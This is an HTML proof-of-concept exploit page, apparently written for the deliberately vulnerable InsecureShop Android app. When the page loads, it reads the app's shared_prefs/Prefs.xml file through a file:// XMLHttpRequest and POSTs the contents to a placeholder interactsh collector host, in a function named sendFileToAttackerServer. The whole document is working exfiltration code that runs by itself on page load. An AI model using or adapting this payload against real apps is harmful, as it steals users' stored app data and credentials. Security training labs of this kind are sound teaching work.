<html>
<body onload="doAttack()">
    <h1>Attack</h1>
    <script>
        function doAttack(){
            var target = "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml";
            
            var xhr1 = new XMLHttpRequest();
            xhr1.overrideMimeType("text/plain; charset=iso-8859-1");
            xhr1.open("GET", target);
            xhr1.onreadystatechange = function(){
                if (xhr1.readyState == 4){
                    var content = xhr1.responseText;
                    sendFileToAttackerServer(content);
                    document.body.appendChild(document.createTextNode(content));
                }
            };
            xhr1.send()
        }

        function sendFileToAttackerServer(content){
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", "http://<INTERACTSH_URL>");
            xhr2.send(encodeURIComponent(content));
            document.body.appendChild(document.createTextNode(xhr2.responseText));
        }   
    </script>
</body>

</html>